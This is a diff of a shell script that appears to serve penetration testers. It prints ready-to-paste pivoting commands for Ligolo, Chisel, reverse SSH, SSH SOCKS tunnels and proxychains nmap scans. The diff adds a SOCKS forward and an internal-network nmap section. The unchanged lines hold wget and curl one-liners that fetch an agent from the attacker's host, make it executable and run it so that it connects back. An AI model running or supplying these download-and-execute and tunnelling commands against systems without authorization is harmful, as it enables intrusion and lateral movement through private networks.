@@ -35,8 +35,9 @@ EOF
 
 echo -e "LHOST=${GREEN}$LHOST${NC}"
 echo -e "TOOLS_PORT=${GREEN}$TOOLS_PORT${NC}"
+echo
+echo
 
-echo ""
 echo '********** Ligolo 🚀**********'
 echo
 echo "# Starting the proxy"
@@ -51,6 +52,8 @@ echo "# Linux"
 echo "wget -O /tmp/agent http://$LHOST:$TOOLS_PORT/pivoting/ligolo/linux/agent && chmod +x /tmp/agent && /tmp/agent -connect $LHOST:9001 -ignore-cert"
 echo
 echo "curl -L -o /tmp/agent http://$LHOST:$TOOLS_PORT/pivoting/ligolo/linux/agent && chmod +x /tmp/agent && /tmp/agent -connect $LHOST:9001 -ignore-cert"
+echo
+echo
 
 echo
 echo '********** Chisel ⛏️**********'
@@ -67,8 +70,9 @@ echo "# Linux"
 echo "wget -O /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
 echo
 echo "curl -L -o /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
+echo
+echo
 
-echo ""
 echo '********** Reverse-SSH (password is password) 🚀**********'
 echo
 echo "# Windows"
@@ -84,7 +88,11 @@ echo
 echo
 echo "ssh <target> -p 31337"
 echo
-echo ""
+echo "# Forward dynamic socks proxy"
+echo "ssh -f -N -D 127.0.0.1:1080 user@<target> -p 31337"
+echo
+echo
+
 echo '********** SSH 🤓**********'
 echo
 echo "Local port to remote port"
@@ -102,9 +110,18 @@ echo "# Forward dynamic socks proxy"
 echo "ssh -f -N -D 127.0.0.1:1080 user@target"
 echo 
 echo "# Using the dynamic proxy"
-echo "proxychains4 -f proxycahins.conf curl http://127.0.0.1:8080"
-echo 
-echo "Quick nmap scan of internal network"
-echo "proxychains4 -f proxychains.conf sudo nmap -PN -sV --top-ports 1000 --open 127.0.0.1"
-echo "proxychains4 -f proxychains.conf sudo nmap -PN -sV --top-ports 1000 --open 0.0.0.0"
-echo "proxychains4 -f proxychains.conf sudo nmap -PN -sV --top-ports 1000 --open 10.0.10.20"
+echo "proxychains4 -f proxychains.conf curl http://127.0.0.1:8080"
+echo
+echo
+
+echo '********** NMAP **********'
+echo
+echo "# Quick nmap scan of internal network"
+echo
+echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT --top-ports=100  --open 192.168.100.10"
+echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT --top-ports=1000 --open 192.168.100.10"
+echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT --top-ports=1000 --open 192.168.100.10"
+echo "proxychains4 -q -f proxychains.conf nmap -vvv -Pn -sV -sT -p8000,8888,3333 --open 192.168.100.10"
+echo
+echo
+
